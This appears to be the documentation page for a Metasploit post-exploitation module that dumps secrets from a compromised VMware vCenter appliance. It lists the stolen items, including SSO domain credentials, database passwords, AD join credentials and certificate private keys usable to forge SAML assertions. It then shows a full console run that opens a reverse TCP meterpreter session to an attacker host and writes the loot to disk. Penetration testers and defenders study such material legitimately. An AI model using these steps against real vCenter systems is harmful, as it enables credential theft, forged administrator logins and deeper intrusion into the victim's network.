Grab secrets and keys from the vCenter server and add them to loot. Secrets include the dcAccountDN
and dcAccountPassword for the vCenter machine which can be used for maniuplating the SSO domain via
standard LDAP interface; good for plugging into the vmware_vcenter_vmdir_ldap module or for adding
new SSO admin users. The MACHINE_SSL, VMCA_ROOT and SSO IdP certificates with assocaited private keys
are also plundered and can be used to sign forged SAML assertions for the /ui admin interface.

## Vulnerable Application
This module is tested against the vCenter appliance only; it will not work on Windows vCenter
instances. It is intended to be run after successfully acquiring root access on a vCenter appliance
and is useful for penetrating further into the environment following a vCenter exploit that results
in a root shell. This module has been tested against vCenter appliance versions 7.0 and 6.7 but will
probably work against other versions of vCenter appliance.

## Verification Steps
This is a post module and requires a meterpreter or shell session on the vCenter appliance with root
access.

1. Start msfconsole
2. Get session on vCenter appliance via exploit of your choice and background it
3. Do: `use post/linux/gather/vcenter_secrets_dump`
4. Do: `set session <session>`
15. Do: `dump`

## Options
**SESSION**

Which session to use, which can be viewed with `sessions -l`

## Scenarios
Example run from meterpreter session on vCenter appliance version 7.0.2

```
msf6 > use multi/handler
set payload linux/x86/meterpreter/reverse_tcp
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
set LPORT 4444
msf6 exploit(multi/handler) > set LHOST 192.168.101.10
LHOST => 192.168.101.10
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.101.10:4444 
[*] Sending stage (989032 bytes) to 192.168.100.11
[*] Meterpreter session 1 opened (192.168.101.10:4444 -> 192.168.100.11:53410 ) at 2022-04-17 19:04:00 -0400

meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
session => 1
msf6 post(linux/gather/vcenter_secrets_dump) > dump

[*] Gathering vSphere SSO Domain Information ...
[*] vSphere Hostname and IPv4: vcenteralpha.cesium137.io [192.168.100.11]
[+] vSphere SSO DC DN: cn=vcenteralpha.cesium137.io,ou=Domain Controllers,dc=alpha,dc=vsphere,dc=local
[+] vSphere SSO DC PW: .Awo;Z1Zwd>x_b=h1FQ'}
[*] Extracting certificates from vSphere platform ...
[+] VMCA_ROOT key: /root/.msf4/loot/20220427093946_default_192.168.100.11_vmca_509760.key
[+] VMCA_ROOT cert: /root/.msf4/loot/20220427093946_default_192.168.100.11_vmca_797084.pem
[+] SSO_STS_IDP key: /root/.msf4/loot/20220427093948_default_192.168.100.11_idp_105611.key
[+] SSO_STS_IDP cert: /root/.msf4/loot/20220427093948_default_192.168.100.11_idp_779741.pem
[+] MACHINE_SSL_CERT key: /root/.msf4/loot/20220427093949_default_192.168.100.11_ssl_410730.key
[+] MACHINE_SSL_CERT cert: /root/.msf4/loot/20220427093950_default_192.168.100.11_ssl_759902.pem
[+] DATA-ENCIPHERMENT key: /root/.msf4/loot/20220427093950_default_192.168.100.11_data_199784.key
[+] DATA-ENCIPHERMENT cert: /root/.msf4/loot/20220427093951_default_192.168.100.11_data_119050.pem
[*] Extracting PostgreSQL database credentials ...
[+] VCDB Name: VCDB
[+] VCDB User: vc
[+] VCDB PW: my!h@)IN4jw$nHT{
[*] Searching for secrets in VM Guest Customization Specification XML ...
[*] Initial administrator account password found
[+] Built-in administrator PW: Metasploit1$
[*] AD domain join account found
[+] AD User: administrator@cesium137.io
[+] AD Pass: ThisIsSecret!
[*] Post module execution completed
```
